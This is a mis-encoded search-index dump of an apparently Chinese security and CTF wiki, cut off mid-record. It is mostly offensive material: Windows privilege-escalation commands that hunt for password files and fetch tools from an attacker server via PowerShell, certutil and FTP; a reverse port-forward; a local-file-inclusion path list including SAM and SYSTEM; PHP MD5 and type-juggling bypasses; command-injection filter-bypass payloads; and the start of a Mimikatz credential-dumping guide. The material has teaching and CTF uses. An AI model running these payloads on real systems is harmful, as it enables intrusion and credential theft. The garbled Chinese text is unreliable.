ç³»ç»Ÿä¸­æ˜¯å¦ä»»ä½•æœ‰è¶£çš„æ–‡ä»¶ï¼Ÿå¯èƒ½åœ¨ç”¨æˆ·ç›®å½•ï¼ˆæ¡Œé¢ï¼Œæ–‡æ¡£ç­‰ï¼‰ï¼Ÿ dir /s *pass* == *vnc* == *.config* 2nulGet-Childitem â€“Path C:\\Users\\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue ç³»ç»Ÿä¸­æ˜¯å¦æœ‰åŒ…å«å¯†ç çš„æ–‡ä»¶ï¼Ÿ findstr /si password *.xml *.ini *.txt *.config 2nulGet-ChildItem C:\\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern password é™„å½•ä¼ è¾“æ–‡ä»¶ åœ¨ç‰¹æƒå‡çº§è¿‡ç¨‹ä¸­çš„æŸä¸ªæ—¶å€™ï¼Œä½ éœ€è¦å°†æ–‡ä»¶æ”¾åˆ°ä½ çš„ç›®æ ‡ä¸Šã€‚ä¸‹é¢æ˜¯ä¸€äº›ç®€å•çš„æ–¹æ³•æ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚ Powershell Cmdletï¼ˆPowershell 3.0åŠæ›´é«˜ç‰ˆæœ¬ï¼‰ Invoke-WebRequest https://myserver/filename -OutFile C:\\Windows\\Temp\\filename Powershellä¸€è¡Œä»£ç å®ç°æ–¹æ³•ï¼š (New-Object System.Net.WebClient).DownloadFile(https://myserver/filename, C:\\Windows\\Temp\\filename) Powershellè„šæœ¬ echo $webclient = New-Object System.Net.WebClient wget.ps1echo $url = http://IPADDRESS/file.exe wget.ps1echo $file = output-file.exe wget.ps1echo $webclient.DownloadFile($url,$file) wget.ps1 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 é€šè¿‡æ–‡æœ¬æ–‡ä»¶çš„éäº¤äº’å¼FTPã€‚å½“ä½ åªæœ‰æœ‰é™çš„å‘½ä»¤æ‰§è¡Œæ—¶è¿™å¾ˆæœ‰ç”¨ã€‚ echo open 10.10.10.11 21 ftp.txtecho USER username ftp.txtecho mypassword ftp.txtecho bin ftp.txtecho GET filename ftp.txtecho bye ftp.txt ftp -v -n -s:ftp.txtCERTUTIL certutil.exe -urlcache -split -f https://myserver/filename outputfilename è½¬å‘ç«¯å£ è¿™å¯¹äºæš´éœ²æœºå™¨å¤–éƒ¨ä¸å¯ç”¨çš„å†…éƒ¨æœåŠ¡éå¸¸æœ‰ç”¨ï¼Œé€šå¸¸æ˜¯ç”±äºé˜²ç«å¢™è®¾ç½®ã€‚ ä¸Šä¼ plink.exeåˆ°ç›®æ ‡ã€‚ åœ¨æ”»å‡»æœºå™¨ä¸Šå¯åŠ¨SSHã€‚ ä¾‹å¦‚è¦å…¬å¼€SMBï¼Œåœ¨ç›®æ ‡ä¸Šè¿è¡Œï¼š plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS æ³¨æ„ï¼šä»Windows 10çš„ç§‹å­£åˆ›ä½œè€…æ›´æ–°ç‰ˆæœ¬å¼€å§‹ï¼ŒOpenSSHå·²ç»åœ¨Windowsçš„betaç‰ˆæœ¬ä¸­æ¨å‡ºï¼Œæ‰€ä»¥æˆ‘é¢„è®¡æœ‰ä¸€å¤©æˆ‘ä»¬å¯èƒ½åªèƒ½ä½¿ç”¨æ™®é€šçš„æ—§çš„SSHå‘½ä»¤è¿›è¡Œç«¯å£è½¬å‘ï¼Œå…·ä½“å–å†³äºæ˜¯å¦å¯ç”¨ã€‚ æœ¬åœ°æ–‡ä»¶åŒ…å«åˆ—è¡¨ è¿™ä¸æ˜¯ä¸€ä¸ªè¯¦å°½çš„åˆ—è¡¨ï¼Œå®‰è£…ç›®å½•ä¼šæœ‰æ‰€ä¸åŒï¼Œæˆ‘åªåˆ—å‡ºäº†ä¸€äº›å¸¸è§çš„æ–‡ä»¶è·¯å¾„ã€‚ C:\\Apache\\conf\\httpd.confC:\\Apache\\logs\\access.logC:\\Apache\\logs\\error.logC:\\Apache2\\conf\\httpd.confC:\\Apache2\\logs\\access.logC:\\Apache2\\logs\\error.logC:\\Apache22\\conf\\httpd.confC:\\Apache22\\logs\\access.logC:\\Apache22\\logs\\error.logC:\\Apache24\\conf\\httpd.confC:\\Apache24\\logs\\access.logC:\\Apache24\\logs\\error.logC:\\Documents and Settings\\Administrator\\NTUser.datC:\\php\\php.iniC:\\php4\\php.iniC:\\php5\\php.iniC:\\php7\\php.iniC:\\Program Files (x86)\\Apache Group\\Apache\\conf\\httpd.confC:\\Program Files (x86)\\Apache Group\\Apache\\logs\\access.logC:\\Program Files (x86)\\Apache Group\\Apache\\logs\\error.logC:\\Program Files (x86)\\Apache Group\\Apache2\\conf\\httpd.confC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\access.logC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\error.logc:\\Program Files (x86)\\php\\php.iniC:\\Program Files\\Apache Group\\Apache\\conf\\httpd.confC:\\Program Files\\Apache Group\\Apache\\conf\\logs\\access.logC:\\Program Files\\Apache Group\\Apache\\conf\\logs\\error.logC:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.confC:\\Program Files\\Apache Group\\Apache2\\conf\\logs\\access.logC:\\Program Files\\Apache Group\\Apache2\\conf\\logs\\error.logC:\\Program Files\\FileZilla Server\\FileZilla Server.xmlC:\\Program Files\\MySQL\\my.cnfC:\\Program Files\\MySQL\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.1\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.1\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.5\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.5\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.6\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.6\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.7\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.7\\my.iniC:\\Program Files\\php\\php.iniC:\\Users\\Administrator\\NTUser.datC:\\Windows\\debug\\NetSetup.LOGC:\\Windows\\Panther\\Unattend\\Unattended.xmlC:\\Windows\\Panther\\Unattended.xmlC:\\Windows\\php.iniC:\\Windows\\repair\\SAMC:\\Windows\\repair\\systemC:\\Windows\\System32\\config\\AppEvent.evtC:\\Windows\\System32\\config\\RegBack\\SAMC:\\Windows\\System32\\config\\RegBack\\systemC:\\Windows\\System32\\config\\SAMC:\\Windows\\System32\\config\\SecEvent.evtC:\\Windows\\System32\\config\\SysEvent.evtC:\\Windows\\System32\\config\\SYSTEMC:\\Windows\\System32\\drivers\\etc\\hostsC:\\Windows\\System32\\winevt\\Logs\\Application.evtxC:\\Windows\\System32\\winevt\\Logs\\Security.evtxC:\\Windows\\System32\\winevt\\Logs\\System.evtxC:\\Windows\\win.iniC:\\xampp\\apache\\conf\\extra\\httpd-xampp.confC:\\xampp\\apache\\conf\\httpd.confC:\\xampp\\apache\\logs\\access.logC:\\xampp\\apache\\logs\\error.logC:\\xampp\\FileZillaFTP\\FileZilla Server.xmlC:\\xampp\\MercuryMail\\MERCURY.INIC:\\xampp\\mysql\\bin\\my.iniC:\\xampp\\php\\php.iniC:\\xampp\\security\\webdav.htpasswdC:\\xampp\\sendmail\\sendmail.iniC:\\xampp\\tomcat\\conf\\server.xml"},{"title":"MD5ç»•è¿‡","path":"/wiki/WP/PHPç‰¹æ€§/MD5ç»•è¿‡.html","content":"çŸ¥è¯†ç‚¹å¼±æ¯”è¾ƒç±»å‹å­—ç¬¦ä¸²å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œä¼šæŠŠå­—ç¬¦ä¸²å¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—(å¦‚æœå­—ç¬¦ä¸²å¼€å¤´æœ‰æ•°å­—ï¼Œåˆ™è½¬æ¢ä¸ºå¼€å¤´æ•°å­—ï¼Œæ²¡æœ‰åˆ™è½¬æ¢ä¸º0) ==ï¼šåªæ¯”è¾ƒæ•°æ®å€¼â€”â€”æ•°æ®å€¼ç›¸åŒï¼Œä¸æ¯”è¾ƒæ•°æ®ç±»å‹!=: åªæ¯”è¾ƒæ•°æ®å€¼â€”â€”æ•°æ®å€¼ä¸åŒ var_dump(123==123a);#bool(true)var_dump(123==1234a);#bool(false)var_dump(0==abc);#bool(true) å¼ºæ¯”è¾ƒç±»å‹ä¸ä»…è¦æ¯”è¾ƒæ•°æ®çš„å€¼ä¹Ÿè¦æ¯”è¾ƒæ•°æ®çš„ç±»å‹ï¼Œä¾‹å¦‚strå’Œintä¸¤ç§æ•°æ®ç±»å‹å°±ä¸ä¼šç›¸ç­‰ ===ï¼šæ¯”è¾ƒæ•°æ®ç±»å‹â€”â€”æ•°æ®ç±»å‹ç›¸åŒ æ¯”è¾ƒæ•°æ®å€¼â€”â€”æ•°æ®å€¼ç›¸åŒ!==ï¼šæ¯”è¾ƒæ•°æ®ç±»å‹â€”â€”æ•°æ®ç±»å‹ä¸åŒ || æ¯”è¾ƒæ•°æ®å€¼â€”â€”æ•°æ®å€¼ä¸åŒ var_dump(123===123a);#bool(false)var_dump(123===123);#bool(false)var_dump(123===123);#bool(true å½“phpå¤„ç†å­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€œ â€æˆ–è€…â€œ â€æ¥æ¯”è¾ƒ å½“â€œâ€æ—¶ï¼š phpæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥è¦ç»•è¿‡â€â€ï¼Œéœ€è¦æƒ³åŠæ³•è®©ä¸¤è¾¹çš„ä¸åŒæ•°å€¼ç»è¿‡md5åŠ å¯†åéƒ½ä¸ºâ€œ0Eâ€å¼€å¤´ï¼Œè¿™æ ·å½“å¤„ç†åˆ°è¿™é‡Œçš„ä»£ç æ—¶ï¼Œphpä¼šè®¤ä¸ºå®ƒä»¬ä¸¤ä¸ªéƒ½ä¸º0ï¼Œå³å¯ç»•è¿‡ã€‚ å¼€å¤´ä¸º0Eï¼ˆMD5å€¼ï¼‰å­—æ¯æ•°å­—æ··åˆç±»å‹ï¼šs878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904çº¯å¤§å†™å­—æ¯ï¼šQLTHNDT0e405967825401955372549139051580QNKCDZO0e830400451993494058024219903391EEIZDOI0e782601363539291779881938479162çº¯æ•°å­—ï¼š2406107080e46209743190650901956298873685440116270630e48580568703443990593836270177547756350650e99821208994664096759945036116847905553610e643442214660994430134492464512 5432453531 0e51231869908588163086189052609755796798200e877622011730221803461740184915 55853935790e66435735538230580599276533702363765525010e165886706997482187870215578015 7124129977 0e500007361044747804682122060876 71975461970e9151885760724691014573156755027656486157 0e451569119711843337267091732412 phpä¸­çš„md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ç±»å‹æ•°æ®ï¼Œå¯¹äºæ•°ç»„ç±»å‹æ•°æ®è¿”å›NULLï¼Œå½“æˆ‘ä»¬ä¼ å…¥ä¸¤ä¸ªæ•°ç»„æ—¶ï¼Œå°±ä¼šå˜æˆä¸¤ä¸ªNULLï¼Œä¹Ÿå°±æ˜¯NULLNULLï¼ŒæˆåŠŸç»•è¿‡ å½“ä¸ºâ€œâ€ï¼šåœ¨ç±»å‹ç›¸åŒæ—¶æ‰ç›¸ç­‰ã€‚â€â€œå³non-strictæ¯”è¾ƒç¬¦ï¼Œä¼šåœ¨ç±»å‹è½¬æ¢åè¿›è¡Œæ¯”è¾ƒã€‚ æ­¤å¤–0 å­—ç¬¦ä¼šè¢«è®¤ä¸ºæ˜¯æ­£ç¡®çš„ï¼Œå¯ä»¥ç»•è¿‡éªŒè¯ã€‚"},{"title":"linuxæ ‡å‡†è¾“å…¥è¾“å‡º","path":"/wiki/WP/REC/linuxæ ‡å‡†è¾“å…¥è¾“å‡º.html","content":"web42if(isset($_GET[c])) $c=$_GET[c]; system($c. /dev/null 21);else highlight_file(__FILE__); çŸ¥è¯†ç‚¹ devnull 210 æ ‡å‡†è¾“â¼Š1 æ ‡å‡†è¾“å‡º2 é”™è¯¯è¾“å‡ºåœ¨ç±»Unixç³»ç»Ÿä¸­,/dev/null,æˆ–ç§°ç©ºè®¾å¤‡,æ˜¯â¼€ä¸ªç‰¹æ®Šçš„è®¾å¤‡â½‚ä»¶,å®ƒä¸¢å¼ƒâ¼€åˆ‡å†™â¼Šå…¶ä¸­çš„æ•°æ®(ä½†æŠ¥å‘Šå†™â¼Šæ“ä½œæˆåŠŸ)åŒºåˆ«ï¼š2/dev/null æŠŠé”™è¯¯è¾“å‡ºåˆ°ç©ºè®¾å¤‡ï¼ˆå³ä¸¢å¼ƒï¼‰/dev/null 21 ç›¸å½“äº1/dev/null 21 å³æŠŠæ ‡å‡†è¾“å‡ºä¸¢å¼ƒï¼Œå¹¶ä¸”æŠŠé”™è¯¯è¾“å‡ºè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚åˆè®¡èµ·æ¥å°±æ˜¯é”™è¯¯å’Œæ ‡å‡†è¾“å‡ºéƒ½è¾“å‡ºåˆ°ç©ºè®¾å¤‡21 /dev/null é”™è¯¯è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼Œå³è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œâ½½æ ‡å‡†è¾“å‡ºè¢«ä¸¢å¼ƒé‡å®šå‘ å’Œ å‰è€…ä¼šå…ˆæ¸…ç©ºâ½‚ä»¶ï¼Œç„¶åå†å†™â¼Šå†…å®¹ï¼Œåè€…ä¼šå°†é‡å®šå‘çš„å†…å®¹è¿½åŠ åˆ°ç°æœ‰â½‚ä»¶çš„å°¾éƒ¨. è§£é¢˜å…³é”®ç‚¹ åˆ†å‰²ï¼š| || ?c=tac flag |ls;"},{"title":"ç‰¹æ€§","path":"/wiki/WP/PHPç‰¹æ€§/ç‰¹æ€§.html","content":"1.intval()intval() å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ var çš„ integer æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1 intval($num, 0) çš„ä½œç”¨:intval() æ˜¯ PHP å‡½æ•°ï¼Œç”¨äºå°†å˜é‡ $num è½¬æ¢ä¸ºæ•´æ•°ã€‚å‚æ•° 0 è¡¨ç¤ºè¿›åˆ¶è‡ªåŠ¨æ£€æµ‹ï¼šå¦‚æœ $num ä»¥ 0x æˆ– 0X å¼€å¤´ï¼ˆå¦‚ 0x117cï¼‰ï¼ŒæŒ‰åå…­è¿›åˆ¶è½¬æ¢ã€‚å¦‚æœ $num ä»¥ 0 å¼€å¤´ï¼ˆå¦‚ 010574ï¼‰ï¼ŒæŒ‰å…«è¿›åˆ¶è½¬æ¢ã€‚å…¶ä»–æƒ…å†µï¼ˆå¦‚ 4476ï¼‰ï¼ŒæŒ‰åè¿›åˆ¶è½¬æ¢ã€‚ 2. æ­£åˆ™show_source(__FILE__);include(flag.php);$a=$_GET[cmd];if(preg_match(/^php$/im, $a)) if(preg_match(/^php$/i, $a)) echo hacker; else echo $flag; else echo nonononono; /iè¡¨ç¤ºåŒ¹é…å¤§å°å†™å­—ç¬¦ ^ å’Œ $ åŒæ—¶ä½¿ç”¨æ—¶ï¼Œè¡¨ç¤ºç²¾ç¡®åŒ¹é…ï¼Œéœ€è¦åŒ¹é…ä»¥phpå¼€å¤´å’Œä»¥phpç»“å°¾/m å¤šè¡ŒåŒ¹é… è‹¥å­˜åœ¨æ¢è¡Œ å¹¶ä¸”æœ‰å¼€å§‹^æˆ–ç»“æŸ$ç¬¦çš„æƒ…å†µä¸‹ï¼Œå°†ä»¥æ¢è¡Œä¸ºåˆ†éš”ç¬¦ï¼Œé€è¡Œè¿›è¡ŒåŒ¹é…ä½†æ˜¯å½“å‡ºç°æ¢è¡Œç¬¦ %0açš„æ—¶å€™ï¼Œ$cmdçš„å€¼ä¼šè¢«å½“åšä¸¤è¡Œå¤„ç†ï¼Œè€Œæ­¤æ—¶ç¬¬äºŒä¸ªifæ­£åˆ™åŒ¹é…ä¸ç¬¦åˆä»¥phpå¼€å¤´å’Œä»¥phpç»“å°¾ 3.in_array()in_array(search,array,type)å¦‚æœç»™å®šçš„å€¼ search å­˜åœ¨äºæ•°ç»„ array ä¸­åˆ™è¿”å› trueã€‚å¦‚æœç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º trueï¼Œå‡½æ•°åªæœ‰åœ¨å…ƒç´ å­˜åœ¨äºæ•°ç»„ä¸­ä¸”æ•°æ®ç±»å‹ä¸ç»™å®šå€¼ç›¸åŒæ—¶æ‰è¿”å› trueã€‚å¦‚æœæ²¡æœ‰åœ¨æ•°ç»„ä¸­æ‰¾åˆ°å‚æ•°ï¼Œå‡½æ•°è¿”å› falseã€‚æ³¨é‡Šï¼šå¦‚æœ search å‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œä¸” type å‚æ•°è®¾ç½®ä¸º trueï¼Œåˆ™æœç´¢åŒºåˆ†â¼¤â¼©å†™ã€‚ æ²¡æœ‰ç¬¬ä¸‰ä¸ªå‚æ•°çš„æ—¶å€™è¿›â¾çš„å°±æ˜¯å¼±â½è¾ƒï¼Œå°±ä¼šå­˜åœ¨å¼ºåˆ¶çš„ç±»å‹è½¬æ¢ï¼Œå¦‚123.phpå°±ä¼šè½¬æ¢æˆ123 4.ä¼˜å…ˆçº§ and5. åå°„ç±»åå°„ç±»ReflectionClassæ‰§â¾å‘½ä»¤ReflectionClassåå°„ç±»åœ¨PHP5æ–°åŠ â¼Šï¼Œç»§æ‰¿â¾ƒReflectorï¼Œå®ƒå¯ä»¥ä¸å·²å®šä¹‰çš„ç±»å»ºâ½´æ˜ å°„å…³ç³»ï¼Œé€šè¿‡åå°„ç±»å¯ä»¥å¯¹ç±»æ“ä½œåå°„ç±»ä¸ä»…ä»…å¯ä»¥å»ºâ½´å¯¹ç±»çš„æ˜ å°„ï¼Œä¹Ÿå¯ä»¥å»ºâ½´å¯¹PHPåŸºæœ¬â½…æ³•çš„æ˜ å°„ï¼Œå¹¶ä¸”è¿”å›åŸºæœ¬â½…æ³•æ‰§â¾çš„æƒ…å†µã€‚å› æ­¤å¯ä»¥é€šè¿‡å»ºâ½´åå°„ç±»new ReflectionClass(system(cmd))æ¥æ‰§â¾å‘½ä»¤ 6.is_numeric()is_numeric() â½¤äºæ£€æµ‹æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å›true ï¼Œå¦åˆ™è¿”å›falseã€‚å¦‚æœå­—ç¬¦ä¸²ä¸­å«æœ‰â¼€ä¸ªeä»£è¡¨ç§‘å­¦è®¡æ•°æ³•ï¼Œä¹Ÿå¯è¿”å›trueã€‚ 7.call_user_func()call_user_func() å‡½æ•°â½¤äºè°ƒâ½¤â½…æ³•æˆ–è€…å˜é‡ï¼Œç¬¬â¼€ä¸ªå‚æ•°æ˜¯è¢«è°ƒâ½¤çš„å‡½æ•°ï¼Œç¬¬â¼†ä¸ªæ˜¯è°ƒâ½¤çš„å‡½æ•° çš„å‚æ•° 8."},{"title":"RECè¿‡æ»¤","path":"/wiki/WP/REC/RECè¿‡æ»¤.html","content":"RECping -c 1 wwww.baidu.com ping -c 1 wwww.baidu.com åœ¨å‘½ä»¤æ‰§è¡Œæœ‰ä¸‹é¢å‡ ç§å¯èƒ½ï¼š å‘½ä»¤å¯æ§ æ¯”å¦‚æˆ‘ä»¬å¯ä»¥æ§åˆ¶pingè¿™ä¸ªå­—ç¬¦ä¸² å‚æ•°å¯æ§ -c å¯æ§ å‚æ•°å€¼å¯æ§ 1å’Œwww.baidu.com å¯æ§ æ•´ä½“å¯æ§ï¼Œä½†æ˜¯è¦çªç ´è¿‡æ»¤ æˆ‘ä»¬é‡åˆ°å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦é¦–å…ˆåˆ¤æ–­å¯æ§çš„ä½ç½®ï¼Œç„¶åé’ˆå¯¹æ€§çš„ç»•è¿‡ å¯ä»¥ç”¨ç³»ç»Ÿå‡½æ•°:system exec highlight system(â€˜lsâ€™); exec() **exec()**é»˜è®¤æ²¡æœ‰å›æ˜¾,éœ€è¦æ‰‹åŠ¨åŠ ä¸Šecho.è€Œä¸”åªä¼šå›æ˜¾å‡ºä¸€è¡Œç»“æœ,å› æ­¤å¸¸ç”¨ç¬¬äºŒä¸ªæ•°ç»„å‚æ•°æ¥æ”¶å¤šè¡Œç»“æœ. payload:$arr=[]; echo exec(ipconfig,$arr); var_dump($arr); **shell_exec()**é»˜è®¤æ²¡æœ‰å›æ˜¾,éœ€è¦æ‰‹åŠ¨åŠ ä¸Šecho,å¯ä»¥è¾“å‡ºå¤šè¡Œç»“æœ. payload:echo shell_exec(ipconfig); highlight å…¶ä»–å‡½æ•° passthru echo phpä¼ªåè®® show_source passthru(â€˜lsâ€™); åŒ system echo tac config.php; PHP æ”¯æŒä¸€ä¸ªæ‰§è¡Œè¿ç®—ç¬¦ï¼šåå¼•å·ï¼ˆ``ï¼‰ã€‚æ³¨æ„è¿™ä¸æ˜¯å•å¼•å·ï¼PHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼‰ã€‚ - ä¼ªåè®®:include(php://filter/read=convert.base64-encode/resource=config.php); - show_source(config.php); //å’Œhighlight_file() ä¸€æ ·ï¼Œå°†æŒ‡å®š PHP æ–‡ä»¶çš„æºä»£ç ä»¥é«˜äº®å½¢å¼è¾“å‡ºåˆ°æµè§ˆå™¨æˆ–è¿”å›ä¸ºå­—ç¬¦ä¸² ç”¨getæ–¹å¼ ?c=echo \\`$_GET[1]`\\;1=tac config.php æ„é€ system ?c=$a=sys;$b=tem;$d=$a.$b;$d(cat config.php); cat è¢«è¿‡æ»¤ï¼šé™¤äº†cat è¿˜æœ‰ tacã€moreã€ lessã€headã€tailã€nlã€sedã€sortã€uniqã€rev æ–‡ä»¶æœ¬èº«è¢«è¿‡æ»¤ï¼Œå¯ä»¥æ¨¡ç³ŠåŒ¹é… con* ï¼Œä¹Ÿå¯ä»¥base64åŠ å¯†è§£å¯† ?c=$a=base64_decode(Y2F0IGNvbmZpZy5waHA=);passthru($a); Y2F0IGNvbmZpZy5waHA=æ˜¯cat config.phpçš„base64åŠ å¯† å¦‚æœï¼›è¢«ç¦ï¼Œå¯ä»¥å°è¯•é—­åˆæ•´ä¸ªphpä»£ç  ? å‚æ•°æ˜¯C å¯ä»¥ç”¨$_GET[a] æ¥ç»•è¿‡ 1.æ¶‰åŠåˆ°ä¸€ä¸ªphpçš„ä»£ç ç»“æ„ï¼Œ.....â‘¡payloadä¸ºï¼š?c=include $_GET[a]?ï¼Œç­‰åŒäºï¼Œphpçš„æœ€åä¸€è¡Œä»£ç å¯ä»¥çœå»åˆ†å·.....â‘¢includeå‡½æ•°åŒ…å«æ–‡ä»¶ï¼Œä¸”é¢˜ç›®æ˜¯å¯¹å‚æ•°cæ­£åˆ™è¿‡æ»¤ï¼Œå› æ­¤GETå‹ä¼ å‚aå¯ä»¥ç»•è¿‡ï¼Œä»è€Œæ‰§è¡Œæˆ‘ä»¬çš„ä¼ªåè®®æ–‡ä»¶å‘½ä»¤ï¼Œè¯»å–config.phpæ–‡ä»¶ï¼šphp://filter/convert.base64-encode/resource=./config.phpâ‘£å› æ­¤è¿èµ·æ¥æ„é€ çš„payloadä¸ºï¼š ?c=include $_GET[a]?a=php://filter/convert.base64-encode/resource=config.php2./?c=echo `$_GET[a]`?a=cat config.php è®©å…¶echoä¸€ä¸ªgetè¯·æ±‚ï¼Œ?é—­åˆï¼Œè¯·æ±‚å†…å®¹ä¸ºcat config.php ä¹Ÿå¯ä»¥ç”¨postæ¥ç»•è¿‡ï¼šå…ˆ?cecho $_POST[a\\];ç„¶åå†ç”¨hackbarä¼ å‚æ•° a cat config.php åªç¦ç”¨äº†*å’Œ?å¸¸ç”¨é€šé…ç¬¦ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–é€šé…ç¬¦[c1-c2],[!c1-c2],[list]ç­‰ payloadï¼š?cecho tac confi[g][!0-9]ph[p]; nginx æ—¥å¿—æ–‡ä»¶è·¯å¾„ varlognginxaccess.log å¯ä»¥ç”¨ cvarlognginxaccess.log1system(â€œtac%2036d.phpâ€); æ¥ç»•è¿‡c çš„æ£€æµ‹ print_r(glob(â€œ*â€)) : glob()å‡½æ•°è¿”å›åŒ¹é…æŒ‡å®šæ¨¡å¼çš„æ–‡ä»¶åæˆ–ç›®å½•ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨globå‡½æ•°æ¥æŸ¥æ‰¾æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥å®ç°ç›®å½•çš„éå† scandir()ä¹Ÿå¯ä»¥ï¼Œå…·ä½“ç”¨æ³• :print_r(scandir(â€˜.â€˜)) æ–‡ä»¶åŒ…å«çš„ç”¨å¤„åœ¨phpä¸­åˆ©ç”¨è¯¥å‡½æ•°å¯ä»¥å°†å…¶ä»–æ–‡ä»¶å¼•å…¥å½“å‰phpæ–‡ä»¶ï¼Œè¢«å¼•å…¥çš„æ–‡ä»¶é‡Œæœ‰phpè¯­å¥å°±èƒ½æ­£å¸¸å‘æŒ¥ä½œç”¨ å¯ä»¥å…ˆå¼•å…¥æ–‡ä»¶ï¼Œå†ç”¨ä¸­å›½èšå‰‘è¿æ¥ ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ï¼Œå‚è€ƒ12 è¿‡æ»¤ç©ºæ ¼cat$IFSflag.txtcat$IFS$9flag.txt $IFS$1 ä¹Ÿå¯ä»¥catflag.txt catflag.txt %0aä»£æ›¿æ¢è¡Œï¼Œ%09ä»£æ›¿TABé”® è¿‡æ»¤ ï¼šå¯ä»¥å…ˆç›®å½•å†æŸ¥çœ‹ cd xxxx;cat xxx"},{"title":"Mimikatzæ•™ç¨‹","path":"/wiki/å†…ç½‘/ææƒ/Mimikatzæ•™ç¨‹.html","content":"0x00 ç®€ä»‹Mimikatz æ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„è½»é‡çº§è°ƒè¯•ç¥å™¨ï¼Œé€šè¿‡å®ƒä½ å¯ä»¥æå‡è¿›ç¨‹æƒé™æ³¨å…¥è¿›ç¨‹è¯»å–è¿›ç¨‹å†…å­˜ï¼Œå½“ç„¶ä»–æœ€å¤§çš„äº®ç‚¹å°±æ˜¯ä»–å¯ä»¥ç›´æ¥ä» lsass.exe è¿›ç¨‹ä¸­è·å–å½“å‰ç™»å½•ç³»ç»Ÿç”¨æˆ·åçš„å¯†ç ï¼Œ lsassæ˜¯å¾®è½¯Windowsç³»ç»Ÿçš„å®‰å…¨æœºåˆ¶å®ƒä¸»è¦ç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»é™†ç­–ç•¥ï¼Œé€šå¸¸æˆ‘ä»¬åœ¨ç™»é™†ç³»ç»Ÿæ—¶è¾“å…¥å¯†ç ä¹‹åï¼Œå¯†ç ä¾¿ä¼šå‚¨å­˜åœ¨ lsasså†…å­˜ä¸­ï¼Œç»è¿‡å…¶ wdigest å’Œ tspkg ä¸¤ä¸ªæ¨¡å—è°ƒç”¨åï¼Œå¯¹å…¶ä½¿ç”¨å¯é€†çš„ç®—æ³•è¿›è¡ŒåŠ å¯†å¹¶å­˜å‚¨åœ¨å†…å­˜ä¹‹ä¸­ï¼Œ è€Œ mimikatz æ­£æ˜¯é€šè¿‡å¯¹lsassé€†ç®—è·å–åˆ°æ˜æ–‡å¯†ç ï¼ä¹Ÿå°±æ˜¯è¯´åªè¦ä½ ä¸é‡å¯ç”µè„‘ï¼Œå°±å¯ä»¥é€šè¿‡ä»–è·å–åˆ°ç™»é™†å¯†ç ï¼Œåªé™å½“å‰ç™»é™†ç³»ç»Ÿï¼ æ³¨ï¼šä½†æ˜¯åœ¨å®‰è£…äº†KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwindows server 2012æ—¶ï¼Œç³»ç»Ÿçš„å†…å­˜ä¸­å°±ä¸å†ä¿å­˜æ˜æ–‡çš„å¯†ç ï¼Œè¿™æ ·åˆ©ç”¨mimikatzå°±ä¸èƒ½ä»å†…å­˜ä¸­è¯»å‡ºæ˜æ–‡å¯†ç äº†ã€‚mimikatzçš„ä½¿ç”¨éœ€è¦administratorç”¨æˆ·æ‰§è¡Œï¼Œadministratorsä¸­çš„å…¶ä»–ç”¨æˆ·éƒ½ä¸è¡Œã€‚ è¿™é‡Œæ”¾å‡ 